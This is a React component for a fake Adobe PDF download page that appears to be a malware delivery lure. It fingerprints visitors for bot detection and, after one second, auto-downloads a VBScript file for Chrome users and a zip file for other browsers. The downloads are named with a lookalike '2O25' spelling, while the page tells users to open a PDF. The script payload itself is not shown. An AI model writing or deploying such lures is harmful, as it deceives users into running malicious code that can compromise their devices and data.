import { useEffect, useMemo } from "react";
import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
import adobePdfLogo from "@/assets/adobe-pdf-logo.png";
import adobeBg from "@/assets/adobe-bg.png";

const randomHex = (len = 4) =>
  Array.from(crypto.getRandomValues(new Uint8Array(len)))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("")
    .slice(0, len);

const Download = () => {
  const { data: visitorData } = useVisitorData({ extendedResult: true }, { immediate: true });

  useEffect(() => {
    if (visitorData) {
      console.log("Visitor ID:", visitorData.visitorId);
      console.log("Bot detection:", visitorData);
    }
  }, [visitorData]);

  const downloadFile = useMemo(() => {
    const ua = navigator.userAgent;
    const suffix = randomHex(8);
    if (ua.includes("Edg/")) {
      return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
    }
    if (ua.includes("Chrome") && !ua.includes("Edg/")) {
      return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
    }
    return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
  }, []);

  useEffect(() => {
    if (!downloadFile) return;
    const timer = setTimeout(() => {
      const link = document.createElement("a");
      link.href = downloadFile.href;
      link.download = downloadFile.name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 1000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="relative flex min-h-screen flex-col items-center justify-center bg-[#f5f5f5] overflow-hidden">
      {/* Enterprise background */}
      <img src={adobeBg} alt="" className="absolute inset-0 w-full h-full object-fill" />
      {/* Modal card */}
      <div className="relative z-10 bg-white rounded-lg shadow-2xl max-w-lg w-full mx-4 p-8 flex flex-col items-center text-center">
        {/* Adobe PDF Logo */}
        <div className="mb-6">
          <img src={adobePdfLogo} alt="Adobe PDF" className="w-24 h-28 object-contain" />
        </div>

        <h1 className="text-2xl font-bold text-[#1a1a1a] mb-3">Download Complete</h1>

        <p className="text-sm text-[#4A6FA5] italic mb-4">You've received a secure document:</p>

        <p className="text-base text-[#444] mb-1">
          Your Document has been downloaded to your device.
        </p>
        <p className="text-base text-[#444] mb-1">
          Please check your <strong>Downloads</strong> folder
        </p>
        <p className="text-base text-[#444] mb-6">
          and open <strong>2O25_Organizer_02162026.pdf</strong> To view your
          document.
        </p>

        <p className="text-base text-[#444] mb-5">
          If your Download did not start automatically, you can<br />
          download the document again
        </p>

        <a
          href={downloadFile.href}
          download={downloadFile.name}
          className="inline-block bg-[#0078d4] hover:bg-[#106ebe] text-white font-semibold px-8 py-3 rounded text-sm transition-colors"
        >
          Download Document
        </a>
      </div>
    </div>
  );
};

export default Download;
